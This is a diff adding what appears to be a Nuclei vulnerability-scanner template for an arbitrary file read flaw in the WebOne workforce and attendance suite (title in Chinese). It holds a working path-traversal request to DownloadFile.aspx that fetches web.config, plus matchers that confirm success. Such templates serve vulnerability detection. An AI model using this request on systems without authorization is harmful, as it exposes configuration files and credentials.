@@ -1,0 +1,26 @@
+id: WebOne-DownloadFile_aspx-File-reading
+
+info:
+  name: WebOne 劳动力与考勤管理套件 DownloadFile.aspx 任意文件读取漏洞
+  author: WebOne
+  severity: high
+  tags: File reading
+
+http:
+  - raw:
+      - |
+        GET /webForms/Download/DownloadFile.aspx?fileid=/../../web.config&flag=report HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36(KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '<?xml version='
+          - '<configuration>'
+          - '</configuration>'
+        condition: and
+      - type: status
+        status: 
+          - 200
